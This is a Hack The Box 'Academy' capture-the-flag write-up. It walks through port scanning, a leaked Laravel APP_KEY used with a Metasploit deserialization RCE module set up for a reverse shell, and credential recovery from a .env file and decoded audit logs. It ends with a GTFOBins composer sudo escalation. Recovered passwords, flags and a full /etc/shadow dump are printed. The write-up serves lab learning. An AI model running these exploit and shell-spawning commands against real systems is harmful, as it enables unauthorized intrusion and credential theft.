
HTB: Academy
============================

> labruhtooryboi | January 13, 2021


# 10.10.10.215
# academy.htb
# dev-staging-01.academy.htb


					# reconnisance


'''
rustscan -a 10.10.10.215
'''
'''
Open 10.10.10.215:22
Open 10.10.10.215:80
Open 10.10.10.215:33060
'''

'''
nmap -Pn -p 22,80,33060 -sC -sV -v -oN nmapinit.txt 10.10.10.215
'''
'''
Nmap scan report for academy.htb (10.10.10.215)
Host is up (0.11s latency).

PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c0:90:a3:d8:35:25:6f:fa:33:06:cf:80:13:a0:a5:53 (RSA)
|   256 2a:d5:4b:d0:46:f0:ed:c9:3c:8d:f6:5d:ab:ae:77:96 (ECDSA)
|_  256 e1:64:14:c3:cc:51:b2:3b:a6:28:a7:b1:ae:5f:45:35 (ED25519)
80/tcp    open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Hack The Box Academy
33060/tcp open  mysqlx?
| fingerprint-strings: 
|   DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp: 
|     Invalid message"
|_    HY000
1 service unrecognized despite returning data
'''

		

					# enumeration

'''
http:80
/admin.php
(default creds)admin:admin
possible users: cry0l1t3, mrb3n
'''

'''
'''

					# extended enumeration(internet)
					
'''
http://dev-staging-01.academy.htb/
'''

'''
Environment Variables
APP_NAME 	"Laravel"

APP_ENV 	"local"

APP_KEY 	"base64:dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0="

APP_DEBUG 	"true"

APP_URL 	"http://localhost"

'''


					# exploitation

'''
Laravel App
'''

'''
PHP Laravel Framework 5.5.40 / 5.6.x < 5.6.30 - token Unserialize Remote Command Execution (Metasploit)

EDB-ID:47129

CVE:2018-15133, 2017-16894
'''

'''
(msf options)
set APP_KEY dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0=
set RHOSTS 10.10.10.215
set RPORT 80
set VHOST dev-staging-01.academy.htb
set LHOST tun0
set LPORT 4444
'''

					# privelage escalation
					
'''
/usr/bin/python3
python3 -c 'import pty;pty.spawn("/bin/bash")'
'''


'''
(users in /home)
21y4d  
ch4p  
cry0l1t3  
egre55  
g0blin  
mrb3n
'''


linpeas
'''
[+] Searching specific hashes inside files - less false positives (limit 70)
/var/www/html/academy/database/factories/UserFactory.php:$2y$10$TKh8H1.PfQx37YgCzwiKb.KjNyWgaHb9cbcoQgdIVFlYg7B77UdFm
'''


manual enum after a hit on /var/www/html/academy/
'''
/var/www/html/academy/.env

DB_CONNECTION=mysql
DB_HOST=127.0.0.1
DB_PORT=3306
DB_DATABASE=academy
DB_USERNAME=dev
DB_PASSWORD=mySup3rP4s5w0rd!!
'''


'''
*credentials work with ssh
cry0l1t3:mySup3rP4s5w0rd!!
'''


linpeas
'''
User & Groups: uid=1002(cry0l1t3) gid=1002(cry0l1t3) groups=1002(cry0l1t3),4(adm)
'''



more linpeas
'''
-r--r----- 1 root adm 8388720 Sep  4 03:45 /var/log/audit/audit.log.2
-rw-r----- 1 root adm 444644 Jan 14 00:31 /var/log/audit/audit.log
-r--r----- 1 root adm 8388617 Aug 23 21:45 /var/log/audit/audit.log.3
-r--r----- 1 root adm 8388813 Nov  9 10:11 /var/log/audit/audit.log.1


cat * | grep 'comm="su"'


type=TTY msg=audit(1597199293.906:84): tty pid=2520 uid=1002 auid=0 ses=1 major=4 minor=1 comm="su" data=6D7262336E5F41634064336D79210A
'''

'''
6D7262336E5F41634064336D79210A
from hex:mrb3n_Ac@d3my!
'''

'''
*credentials work with ssh
mrb3n:mrb3n_Ac@d3my!
'''

'''
User mrb3n may run the following commands on academy:
    (ALL) /usr/bin/composer
'''


gtfobins
'''
TF=$(mktemp -d)
echo '{"scripts":{"x":"/bin/sh -i 0<&3 1>&3 2>&3"}}' >$TF/composer.json
sudo composer --working-dir=$TF run-script x
'''



					# interesting things

>flags
'''
/home/cry0l1t3/user.txt
d8d528d383ec9951f5df7398f220cc51
'''

'''
/root/root.txt
16c2bad32120c8874dd332f8802414bd
'''



>important users
'''
cry0l1t3 
mrb3n
root
'''



>important passwds and keys
'''
mySup3rP4s5w0rd!!
mrb3n_Ac@d3my!
'''

'''
dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0=
'''



>files and dirs
'''
http80
admin.php
'''

'''
http://dev-staging-01.academy.htb/
Environment & details:
'''

'''
/var/log/audit/audit.log
/var/log/audit/audit.log.1
/var/log/audit/audit.log.2
/var/log/audit/audit.log.3
'''

'''
/usr/bin/composer
'''

'''
/root/academy.txt
'''



>root stuff 
'''
/etc/passwd

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
egre55:x:1000:1000:egre55:/home/egre55:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
mrb3n:x:1001:1001::/home/mrb3n:/bin/sh
cry0l1t3:x:1002:1002::/home/cry0l1t3:/bin/sh
mysql:x:112:120:MySQL Server,,,:/nonexistent:/bin/false
21y4d:x:1003:1003::/home/21y4d:/bin/sh
ch4p:x:1004:1004::/home/ch4p:/bin/sh
g0blin:x:1005:1005::/home/g0blin:/bin/sh
'''

'''
/etc/shadow

root:$6$JZSmH/f8roNUXbLZ$jkYel0vYLpsreyig7f0hvpEY.wJuSdnZyOabqrLdsOKgqny03TrTQLqP7htAjkElm4o45.LdzW3b2uspwCwaP1:18641:0:99999:7:::
daemon:*:18375:0:99999:7:::
bin:*:18375:0:99999:7:::
sys:*:18375:0:99999:7:::
sync:*:18375:0:99999:7:::
games:*:18375:0:99999:7:::
man:*:18375:0:99999:7:::
lp:*:18375:0:99999:7:::
mail:*:18375:0:99999:7:::
news:*:18375:0:99999:7:::
uucp:*:18375:0:99999:7:::
proxy:*:18375:0:99999:7:::
www-data:*:18375:0:99999:7:::
backup:*:18375:0:99999:7:::
list:*:18375:0:99999:7:::
irc:*:18375:0:99999:7:::
gnats:*:18375:0:99999:7:::
nobody:*:18375:0:99999:7:::
systemd-network:*:18375:0:99999:7:::
systemd-resolve:*:18375:0:99999:7:::
systemd-timesync:*:18375:0:99999:7:::
messagebus:*:18375:0:99999:7:::
syslog:*:18375:0:99999:7:::
_apt:*:18375:0:99999:7:::
tss:*:18375:0:99999:7:::
uuidd:*:18375:0:99999:7:::
tcpdump:*:18375:0:99999:7:::
landscape:*:18375:0:99999:7:::
pollinate:*:18375:0:99999:7:::
sshd:*:18481:0:99999:7:::
systemd-coredump:!!:18481::::::
egre55:$6$63ML/QePl9o3/jGv$YvOpS9Y4pH2xJDJ.OYeoGW88OeY7CbMc/mPpYiF55JF82/8Si0wig4ex3nXnGj3f1TA0h4QvFU/vJ9i90xoQP1:18481:0:99999:7:::
lxd:!:18481::::::
mrb3n:$6$3OPUVtwJhZcOdgHP$Vvb1NGqCUistHLa8WtEhrEJTQt7pCePA0ZXGTOFoSphC9/giVLXCVDzEt/AB58YPik5hr/dNUli4lJz67AreC/:18481:0:99999:7:::
cry0l1t3:$6$fJnhoVlO7iymuwJN$.6ZVrMsRCBgegMyItnbkbkmHPxPe/MST5rruStMNFGOtM6JNtPQhJM7Gtv4H7Iz4VSxcmGQAbST0eSKWjGorj.:18484:0:99999:7:::
mysql:!:18481:0:99999:7:::
21y4d:$6$qZkgpWcya4rj6eA.$sH4ZBxJEMrHqskO.P9uMne.4PaORqe3T6eLwiIFuXacrw7BVHOzoZi4OEKmEQ5VZTqpOt1vS8N3fTWzRmPvzA1:18484:0:99999:7:::
ch4p:$6$vlSsIc75Qsy8/rrJ$5JiWH/PAPj9M0FWv80nI6wEnz2le/7U4YdZ1kdt.OZvOfitht3uYMUQkQkt7Rp.aHjaTa7aJwACSze.hXJr/V0:18484:0:99999:7:::
g0blin:$6$asgz3zF/8pV0Hxs0$OoExRb05fgZTEJA/pcGP48a56s5vjHkatw.9HyTjekIZY9v9zJVDCMPEete6Yr4v0YL75/3J4aomUjVScnkVZ0:18484:0:99999:7:::
'''


